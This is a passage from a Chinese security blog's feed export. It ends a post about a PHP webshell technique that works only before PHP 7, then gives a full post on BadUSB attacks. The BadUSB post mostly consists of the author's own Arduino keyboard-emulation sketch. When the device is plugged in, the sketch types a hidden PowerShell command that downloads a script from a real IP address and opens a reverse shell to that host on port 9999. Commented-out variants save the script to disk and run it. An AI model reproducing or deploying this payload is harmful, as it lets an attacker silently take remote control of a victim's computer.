<p><img src="/images/JSshell/htmlphpinfo.png" alt="html"></p>
<p>我们再次访问php页面查看结果发现phpinfo出现在了页面上</p>
<p><img src="/images/JSshell/phpphpinfo.png" alt="html"></p>
<p>这里再测试一下可以利用的版本发现7以上的版本都不能顺利执行</p>
<p><img src="/images/JSshell/7.0.png" alt="html"></p>
<h3 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h3><p>利用条件已经很明确了，必须要php下确实存在的才可以被利用，这个方法可用完全是因为php支持html的原因，php7移除该方法，其实利用条件还是比较苛刻的。</p>
]]></content>
      <categories>
        <category>webshell</category>
      </categories>
      <tags>
        <tag>js</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>BadUsb</title>
    <url>/2019/04/19/BadUsb/</url>
    <content><![CDATA[<p>在2014年美国黑帽大会上，柏林SRLabs的安全研究人员JakobLell和独立安全研究人员Karsten Nohl展示了他们称为“BadUSB”(按照BadBIOS命名)的攻击方法，这种攻击方法让USB安全和几乎所有和USB相关的设备(包括具有USB端口的电脑)都陷入相当危险的状态。</p>
<a id="more"></a>

<h5 id="Windows系统自启动路径"><a href="#Windows系统自启动路径" class="headerlink" title="Windows系统自启动路径"></a>Windows系统自启动路径</h5><pre><code>%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup</code></pre><h4 id="附自己的一些代码"><a href="#附自己的一些代码" class="headerlink" title="附自己的一些代码"></a>附自己的一些代码</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include&lt;Keyboard.h&gt; //包含键盘模块头文件</span></span><br><span class="line">void setup()&#123; //初始化</span><br><span class="line">Keyboard.begin();//开始键盘通信</span><br><span class="line">delay(<span class="number">1000</span>);//延时<span class="number">1000</span>毫秒，</span><br><span class="line">Keyboard.press(KEY_LEFT_GUI);//按下徽标键 也就是win键 </span><br><span class="line">Keyboard.press(<span class="string">'r'</span>);//按下r键 CMD</span><br><span class="line">delay(<span class="number">500</span>); </span><br><span class="line">Keyboard.release(KEY_LEFT_GUI);//松掉win键 </span><br><span class="line">Keyboard.release(<span class="string">'r'</span>);//松掉r键 </span><br><span class="line">Keyboard.println(<span class="string">"cmd"</span>);</span><br><span class="line">delay(<span class="number">500</span>); </span><br><span class="line">//Keyboard.println(<span class="string">"cmd.exe /T:01 /K mode CON: COLS=16 LINES=1"</span>); //缩小窗口</span><br><span class="line">//Keyboard.println(<span class="string">"<span class="variable">$clnt</span> = new-object System.Net.WebClient;<span class="variable">$url</span>= 'http://47.93.12.104/water.ps1';<span class="variable">$file</span> = 'D:\\melon.ps1';<span class="variable">$clnt</span>.DownloadFile(<span class="variable">$url</span>,<span class="variable">$file</span>);D:\\melon.ps1;"</span>);</span><br><span class="line">//.println(<span class="string">"powershell -w hidden while(1)&#123;IEX (New-Object Net.WebClient).DownloadString('D:\\melon.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 47.93.12.104 -port 9999&#125;"</span>);</span><br><span class="line">Keyboard.println(<span class="string">"powershell -w hidden while(1)&#123;IEX (New-Object Net.WebClient).DownloadString('http://47.93.12.104/water.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 47.93.12.104 -port 9999&#125;"</span>);</span><br><span class="line">Keyboard.press(KEY_RETURN);  //按下回车键</span><br><span class="line">Keyboard.release(KEY_RETURN); //释放回车键</span><br><span class="line">Keyboard.end();//结束键盘通讯 </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">void loop()//循环，这里的代码</span><br><span class="line">&#123; </span><br><span class="line">//循环体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>硬件安全</category>
      </categories>
      <tags>
        <tag>钓鱼</tag>
        <tag>USB</tag>
      </tags>
  </entry>
</search>
